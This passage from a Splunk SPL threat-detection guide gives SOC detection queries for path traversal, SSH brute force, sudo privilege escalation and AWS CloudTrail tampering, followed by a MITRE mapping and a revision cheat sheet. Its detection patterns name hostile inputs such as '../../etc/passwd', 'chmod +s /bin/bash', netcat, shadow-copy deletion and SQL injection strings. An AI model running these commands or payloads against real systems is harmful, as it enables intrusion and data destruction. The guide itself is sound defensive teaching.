2. Review web application backend database logs for unexpected query execution.

##### 🛡️ Recommended Response

* Block offending source IP address at the WAF level. Update input validation controls.

---

#### 28. Path Traversal Attack Detection

##### 🎯 What It Detects

HTTP requests containing directory traversal sequences (e.g., `../`, `..%2f`, `/etc/passwd`, `c:\boot.ini`).

##### 🧠 Attack Concept

Attackers use path traversal syntax to escape the web root directory and access sensitive operating system files.

* **MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

##### 📥 Required Log Source

* **Log Source:** Web Server Access Logs / WAF
* **Example Sourcetype:** `access_combined`, `iis`
* **Key Fields:** `src_ip`, `uri_path`, `status`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="access_combined" OR sourcetype="iis"
| eval decoded_uri = lower(uri_path)
| search decoded_uri="*../*" OR decoded_uri="*..\\*" OR decoded_uri="*..%2f*" OR decoded_uri="*etc/passwd*" OR decoded_uri="*win.ini*"
| table _time, src_ip, uri_path, status, http_user_agent

```

##### 🔍 SPL Command Breakdown

* `search decoded_uri="*../*"...`: Matches URL-encoded and unencoded directory traversal attempts.

##### 📊 Example Result *(Illustrative Example)*

| src_ip | uri_path | status |
| --- | --- | --- |
| 45.154.255.12 | /download.php?file=../../../../etc/passwd | 200 |

##### 🚨 Why This Is Suspicious

Attempts to traverse web directories indicate scanning or exploitation aimed at reading arbitrary system files.

##### ⚙️ SOC Tuning

* Ensure path encoding variations are fully covered in decoding logic.

##### 🕵️ Investigation Tips

1. Check if the server returned HTTP 200 (Success) with large payload sizes, indicating file disclosure.
2. Verify file permissions on the target web server host.

##### 🛡️ Recommended Response

* Block source IP on perimeter WAF and patch web application input parameters.

---

### 🐧 Linux Security

#### 29. Linux SSH Brute Force Attack

##### 🎯 What It Detects

Multiple failed SSH login attempts followed by high failure rates or success from a single source IP on a Linux system.

##### 🧠 Attack Concept

Automated dictionary attacks targeting exposed Linux SSH services (port 22) to gain shell access.

* **MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

##### 📥 Required Log Source

* **Log Source:** Linux Security Log (`/var/log/secure` or `/var/log/auth.log`)
* **Example Sourcetype:** `linux_secure`, `syslog`
* **Key Fields:** `process` (sshd), `src_ip`, `user`, `_raw`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="linux_secure" process="sshd"
| rex field=_raw "(Failed password|Invalid user) for (?<target_user>\S+) from (?<source_ip>\d+\.\d+\.\d+\.\d+)"
| stats count as ssh_failures by source_ip, target_user
| where ssh_failures >= 15
| sort - ssh_failures

```

##### 🔍 SPL Command Breakdown

* `process="sshd"`: Isolates events from the Linux SSH daemon.
* `rex field=_raw "..."`: Uses regular expressions to extract target user and source IP from unparsed log text.
* `where ssh_failures >= 15`: Filters for sources exceeding 15 failed password attempts.

##### 📊 Example Result *(Illustrative Example)*

| source_ip | target_user | ssh_failures |
| --- | --- | --- |
| 192.241.220.11 | root | 1420 |
| 192.241.220.11 | admin | 310 |

##### 🚨 Why This Is Suspicious

High-volume SSH failures from remote IPs indicate active brute-force password guessing against Linux hosts.

##### ⚙️ SOC Tuning

* Exclude internal management systems or automated SSH deployment tools (e.g., Ansible, Jenkins).

##### 🕵️ Investigation Tips

1. Check if any `Accepted password` or `Accepted publickey` log events occurred from `source_ip`.
2. Inspect `auditd` or history files for commands executed after the login attempt.

##### 🛡️ Recommended Response

* Block the source IP via `iptables` / `fail2ban` and enforce SSH key-based authentication.

---

#### 30. Linux Suspicious sudo PrivEsc / Command Execution

##### 🎯 What It Detects

Execution of suspicious root-level commands via `sudo` by non-privileged user accounts.

##### 🧠 Attack Concept

Adversaries use `sudo` rights or privilege escalation vulnerabilities to run administrative binaries (`cat /etc/shadow`, `nc`, `chmod +s`).

* **MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

##### 📥 Required Log Source

* **Log Source:** Linux Secure / Auditd / Syslog
* **Example Sourcetype:** `linux_secure`, `auditd`
* **Key Fields:** `user`, `command`, `requested_user`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="linux_secure" COMMAND=*
| rex field=_raw "COMMAND=(?<sudo_command>.*)"
| search sudo_command="*/etc/shadow*" OR sudo_command="*nc *" OR sudo_command="*chmod +s*" OR sudo_command="* /bin/sh*" OR sudo_command="* /bin/bash*"
| table _time, host, user, sudo_command

```

##### 🔍 SPL Command Breakdown

* `sourcetype="linux_secure" COMMAND=*`: Filters for sudo privilege execution logs.
* `search sudo_command="*/etc/shadow*"...`: Isolates administrative commands associated with sensitive file access or shell creation.

##### 📊 Example Result *(Illustrative Example)*

| host | user | sudo_command |
| --- | --- | --- |
| LINUX-APP01 | www-data | /bin/chmod +s /bin/bash |

##### 🚨 Why This Is Suspicious

Service accounts (e.g., `www-data`) invoking `sudo` to modify permissions or open interactive root shells indicates successful exploitation.

##### ⚙️ SOC Tuning

* Whitelist authorized system administration scripts.

##### 🕵️ Investigation Tips

1. Review `/etc/sudoers` configuration on the target host.
2. Audit the user's recent command history (`.bash_history`).

##### 🛡️ Recommended Response

* Revoke sudo privileges for the user and terminate suspicious active shell sessions.

---

### ☁️ Cloud & AWS Security

#### 31. AWS Root Account Usage Detection

##### 🎯 What It Detects

Any API activity or AWS Management Console login performed using the AWS Root Account.

##### 🧠 Attack Concept

The AWS Root account has unrestricted access across all cloud resources. Usage should be restricted to rare account setup tasks; daily operations should use IAM roles instead.

* **MITRE ATT&CK:** T1078.004 — Valid Accounts: Cloud Accounts

##### 📥 Required Log Source

* **Log Source:** AWS CloudTrail Logs
* **Example Sourcetype:** `aws:cloudtrail`
* **Key Fields:** `userIdentity.type` (Root), `eventName`, `sourceIPAddress`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="aws:cloudtrail" "userIdentity.type"="Root"
| table _time, sourceIPAddress, userAgent, eventName, eventSource, awsRegion

```

##### 🔍 SPL Command Breakdown

* `"userIdentity.type"="Root"`: Targets actions performed by the root identity instead of delegated IAM roles.
* `table ...`: Visualizes the action performed (`eventName`), regional location, and source IP address.

##### 📊 Example Result *(Illustrative Example)*

| _time | sourceIPAddress | eventName | awsRegion |
| --- | --- | --- | --- |
| 2026-08-31 18:00 | 203.0.113.10 | RunInstances | us-east-1 |

##### 🚨 Why This Is Suspicious

Using the AWS Root account introduces severe risk; compromise of root credentials leads to complete cloud tenant takeover.

##### ⚙️ SOC Tuning

* Do not exclude root activity; treat every root log event as an auditable security event.

##### 🕵️ Investigation Tips

1. Confirm whether the root login was authorized by cloud administration leadership.
2. Check if Multi-Factor Authentication (MFA) was used during login.

##### 🛡️ Recommended Response

* Lock root credentials, rotate root keys, and enforce MFA.

---

#### 32. AWS CloudTrail Logging Disabled or Modified

##### 🎯 What It Detects

Attempts to stop, modify, or delete AWS CloudTrail trail logging instances.

##### 🧠 Attack Concept

Adversaries disable CloudTrail logging to prevent security teams from recording their cloud infrastructure actions.

* **MITRE ATT&CK:** T1562.002 — Impair Defenses: Disable Cloud Logs

##### 📥 Required Log Source

* **Log Source:** AWS CloudTrail Logs
* **Example Sourcetype:** `aws:cloudtrail`
* **Key Fields:** `eventName` (`StopLogging`, `DeleteTrail`, `UpdateTrail`), `userIdentity.arn`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="aws:cloudtrail" (eventName=StopLogging OR eventName=DeleteTrail OR eventName=UpdateTrail)
| table _time, sourceIPAddress, userIdentity.arn, eventName, requestParameters.name

```

##### 🔍 SPL Command Breakdown

* `eventName=StopLogging OR DeleteTrail OR UpdateTrail`: Filters for API calls that halt or alter CloudTrail logging services.

##### 📊 Example Result *(Illustrative Example)*

| sourceIPAddress | userIdentity.arn | eventName |
| --- | --- | --- |
| 198.51.100.44 | arn:aws:iam::123456789012:user/dev_user | StopLogging |

##### 🚨 Why This Is Suspicious

Disabling cloud security logging is a defense evasion technique used to blind security monitoring tools.

##### ⚙️ SOC Tuning

* Cross-reference with authorized Terraform/CloudFormation infrastructure updates.

##### 🕵️ Investigation Tips

1. Review all actions executed by `userIdentity.arn` prior to disabling CloudTrail.
2. Verify if secondary GuardDuty or SecurityHub alerts were triggered.

##### 🛡️ Recommended Response

* Immediately re-enable CloudTrail logging (`aws cloudtrail start-logging`). Revoke caller IAM keys.

---

## 🗺️ Comprehensive MITRE ATT&CK Mapping Table

| Detection Name | MITRE ATT&CK ID | Technique Name | Tactic |
| --- | --- | --- | --- |
| Account Brute-Force | `T1110.001` | Password Guessing | Credential Access |
| Password Spraying | `T1110.003` | Password Spraying | Credential Access |
| Failed Logins Followed by Success | `T1110` | Brute Force | Credential Access |
| Suspicious Login From New IP | `T1078` | Valid Accounts | Initial Access |
| Impossible Travel Anomaly | `T1078` | Valid Accounts | Initial Access |
| Kerberoasting Attack | `T1558.003` | Kerberoasting | Credential Access |
| Windows Local Account Creation | `T1136.001` | Local Account Creation | Persistence |
| Privileged Group Modification | `T1098` | Account Manipulation | Persistence |
| Suspicious Service Creation | `T1543.003` | Windows Service | Persistence / PrivEsc |
| Scheduled Task Creation | `T1053.005` | Scheduled Task | Persistence |
| Windows Event Log Clearing | `T1070.001` | Clear Windows Logs | Defense Evasion |
| Windows Firewall Disabling | `T1562.004` | Disable or Modify Firewall | Defense Evasion |
| Encoded PowerShell Execution | `T1027` | Obfuscated Files/Info | Execution / Evasion |
| PowerShell Download Activity | `T1105` | Ingress Tool Transfer | Command & Control |
| Office Spawning Command Shell | `T1204.002` | Malicious File | Execution |
| LOLBin Abuse (Certutil) | `T1105` / `T1140` | Ingress Tool Transfer / Deobfuscate | Execution / Evasion |
| Web Shell Process Spawning | `T1505.003` | Web Shell | Persistence |
| Binary in Temp / AppData Path | `T1036` | Masquerading | Defense Evasion |
| Registry Run Key Persistence | `T1547.001` | Registry Run Keys | Persistence |
| LSASS Memory Dumping | `T1003.001` | LSASS Memory | Credential Access |
| Mass Shadow Copy Deletion | `T1490` | Inhibit System Recovery | Impact |
| Network Port Scanning | `T1046` | Network Service Discovery | Reconnaissance |
| C2 Beaconing Pattern | `T1071.001` | Web Protocols | Command & Control |
| Large Outbound Data Transfer | `T1048` | Exfiltration Over Alternative Protocol | Exfiltration |
| DNS Tunneling Indicators | `T1071.004` | DNS | Command & Control / Exfil |
| High DNS Query Volume | `T1590.002` | DNS Discovery | Reconnaissance |
| SQL Injection Attack | `T1190` | Exploit Public Application | Initial Access |
| Path Traversal Attack | `T1190` | Exploit Public Application | Initial Access |
| Linux SSH Brute Force | `T1110.001` | Password Guessing | Credential Access |
| Linux Sudo PrivEsc | `T1548.003` | Sudo and Sudo Caching | Privilege Escalation |
| AWS Root Account Usage | `T1078.004` | Cloud Accounts | Initial Access |
| AWS CloudTrail Disabled | `T1562.002` | Disable Cloud Logs | Defense Evasion |

---

## 🎓 How to Learn These Detections

### Level 1 — Beginner (Core Telemetry & Authentication)

* **Focus:** Master basic filtering, search syntax, and statistical aggregation using `stats`.
* **Key Commands:** `search`, `stats`, `where`, `table`, `sort`, `eval`
* **Detections to Master:**
* Account Brute-Force (#1)
* Linux SSH Brute Force (#29)
* Windows Local Account Creation (#7)
* Windows Event Log Clearing (#11)



### Level 2 — Intermediate (Endpoint, Processes & Script Execution)

* **Focus:** Understand endpoint process relationships, parent-child process chains, and command obfuscation.
* **Key Commands:** `coalesce`, `rex`, `dedup`, `bin`, `lookup`
* **Detections to Master:**
* Encoded PowerShell Execution (#13)
* Office Spawning Shell (#15)
* Scheduled Task Creation (#10)
* Registry Run Key Persistence (#19)



### Level 3 — Network, DNS & Web Hunting

* **Focus:** Analyze traffic patterns, timing anomalies, network protocols, and web attack signatures.
* **Key Commands:** `streamstats`, `timechart`, `len()`, `lower()`, regex field extractions
* **Detections to Master:**
* C2 Beaconing Pattern (#23)
* DNS Tunneling (#25)
* SQL Injection (#27)
* Large Outbound Data Transfer (#24)



### Level 4 — Advanced Analytics & Cloud Detection

* **Focus:** Establish behavioral baselines, track cloud API actions, detect credential dumping, and correlate complex events.
* **Key Commands:** `eventstats`, `spath`, complex boolean logic, multi-data model correlations
* **Detections to Master:**
* LSASS Memory Dumping (#20)
* Impossible Travel Anomaly (#5)
* AWS CloudTrail Disabled (#32)
* Kerberoasting Attack (#6)



---

## ⚡ Quick Revision Table

| Scenario | Core SPL Pattern | Primary Log Source | Key Field |
| --- | --- | --- | --- |
| **Brute Force** | `... | stats count by user, src_ip | where count > 10` | Auth Logs | `user`, `src_ip` |
| **Password Spray** | `... | stats dc(user) as targets by src_ip | where targets > 10` | Azure Sign-in / AD | `user`, `src_ip` |
| **Encoded PowerShell** | `... | search CommandLine="*-enc*" OR ScriptBlockText="*FromBase64*"` | Sysmon / PS Logs | `CommandLine` |
| **LSASS Memory Dump** | `... EventCode=10 TargetImage="*lsass.exe" GrantedAccess="0x1010"` | Sysmon | `TargetImage` |
| **Shadow Copy Delete** | `... CommandLine="*vssadmin*delete*shadows*"` | Sysmon / Event 4688 | `CommandLine` |
| **C2 Beaconing** | `... | streamstats last(_time) | eval gap=_time-prev | stats stdev(gap)` | Proxy / Net Flow | `_time`, `src_ip` |
| **DNS Tunneling** | `... | eval query_len=len(query) | where query_len > 60` | DNS Logs | `query` |
| **SQL Injection** | `... | search uri_query="*union*select*" OR uri_query="*or 1=1*"` | Web Access Logs | `uri_query` |
| **CloudTrail Disabled** | `... EventSource="cloudtrail.amazonaws.com" eventName="StopLogging"` | AWS CloudTrail | `eventName` |

---

# 📄 DELIVERABLE 2 — PDF Revision Reference Guide

The following document is optimized specifically for conversion to PDF or print revision.

### Recommended Tool to Render PDF

To convert this section directly into a clean, formatted PDF document, run the following `pandoc` or `md-to-pdf` command in your terminal:

```bash
# Using Pandoc with xelatex engine
pandoc PDF_REVISION.md -o Splunk_Threat_Hunting_Cheat_Sheet.pdf --pdf-engine=xelatex -V geometry:margin=0.75in

# Alternatively using Node.js md-to-pdf
npx md-to-pdf PDF_REVISION.md

```

---

```markdown
# 🛡️ Splunk SPL Threat Detection & Threat Hunting - PDF Revision Book

**Author:** SOC Detection Engineering Reference  
**Target Audience:** SOC Analysts, Threat Hunters, Incident Responders  
**Format:** Offline Quick-Reference & Exam Revision Guide  

---

## 📘 SECTION 1: SPL QUICK REFERENCE COMMAND CHEAT SHEET

| Command | Syntax Example | Primary Security Use Case |
| :--- | :--- | :--- |
| **stats** | `\| stats count, dc(dest) by src` | Aggregating failure counts & target totals |
| **eventstats** | `\| eventstats avg(bytes) as avg_b by src` | Comparing events against host baselines |
| **streamstats** | `\| streamstats last(_time) as prev by src` | Measuring time intervals for C2 beaconing |
| **eval** | `\| eval MB = bytes / 1024 / 1024` | Performing math & field transformations |
| **where** | `\| where count > 10 AND MB > 500` | Case-sensitive analytical filtering |
| **rex** | `\| rex field=_raw "from (?<src_ip>\d+\..*)"` | Regex field extraction from raw logs |
| **coalesce** | `\| eval user = coalesce(user, TargetUser)` | Normalizing mismatched field names |
| **timechart** | `\| timechart span=1h sum(bytes) by src` | Visualizing traffic spikes over time |
| **lookup** | `\| lookup threat_ips ip as src_ip` | Enriching search data with Threat Intel |

---

## 📘 SECTION 2: CRITICAL LOG SOURCES & EVENT CODES

### Windows Security Event Logs (`WinEventLog:Security`)
* **EventCode 4624:** Successful User Logon
* **EventCode 4625:** Failed User Authentication
* **EventCode 4698:** Scheduled Task Created
* **EventCode 4720:** Local User Account Created
* **EventCode 4728 / 4732 / 4756:** User Added to Security Group
* **EventCode 1102:** Security Event Log Cleared

### Microsoft Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`)
* **EventCode 1:** Process Creation (CommandLine, ParentImage, Hashes)
* **EventCode 3:** Network Connection Initiated
* **EventCode 7:** Image / DLL Loaded
* **EventCode 10:** Process Access (LSASS Memory Dump Tracking)
* **EventCode 11:** File Created / Modified
* **EventCode 12 / 13:** Registry Key Created / Modified

---

## 📘 SECTION 3: TOP 10 MUST-KNOW DETECTION QUERIES

### 1. Brute Force Detection
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4625
| stats count as fails by TargetUserName, IpAddress
| where fails >= 10

```

### 2. Password Spray Detection

```spl
index=* EventCode=4625
| stats dc(TargetUserName) as targets by IpAddress
| where targets >= 10

```

### 3. Encoded PowerShell Execution

```spl
index=* sourcetype="*Sysmon*" EventCode=1 Image="*powershell.exe"
| search CommandLine="*-enc*" OR CommandLine="*-encodedcommand*"

```

### 4. LSASS Memory Access (Mimikatz)

```spl
index=* sourcetype="*Sysmon*" EventCode=10 TargetImage="*lsass.exe"
| where GrantedAccess="0x1010" OR GrantedAccess="0x1f0fff"

```

### 5. Shadow Copy Deletion (Ransomware)

```spl
index=* EventCode=1 CommandLine="*vssadmin*delete*shadows*"

```

### 6. C2 Beaconing (Low Jitter Timing)

```spl
index=* sourcetype="zeek:http"
| streamstats current=f last(_time) as prev_time by src_ip, dest_ip
| eval gap = _time - prev_time
| stats count, stdev(gap) as jitter by src_ip, dest_ip
| where count > 50 AND jitter < 2

```

### 7. DNS Tunneling (Long Queries)

```spl
index=* sourcetype="WinDNS"
| eval qlen = len(query)
| where qlen > 60
| stats count by src_ip, query

```

### 8. Web Shell Execution

```spl
index=* EventCode=1 ParentImage="*w3wp.exe" Image="*cmd.exe"

```

### 9. Suspicious Local Account Creation

```spl
index=* sourcetype="WinEventLog:Security" EventCode=4720

```

### 10. AWS CloudTrail Disabling

```spl
index=* sourcetype="aws:cloudtrail" eventName=StopLogging

```

---

## 📘 SECTION 4: INVESTIGATION CHECKLIST FOR SOC ANALYSTS

1. **Verify Alert Validity:** Rule out vulnerability scanners, scheduled scripts, and authorized IT activities.
2. **Determine Scope:** Identify the primary source host, destination host, and account credentials involved.
3. **Construct Timeline:** Query logs 30 minutes before and after the event to contextualize activity.
4. **Pivot Telemetry Sources:** Correlate endpoint process execution with network traffic and firewall logs.
5. **Enforce Containment:** Isolate affected hosts, block malicious external IPs, and revoke active user tokens.

```

```
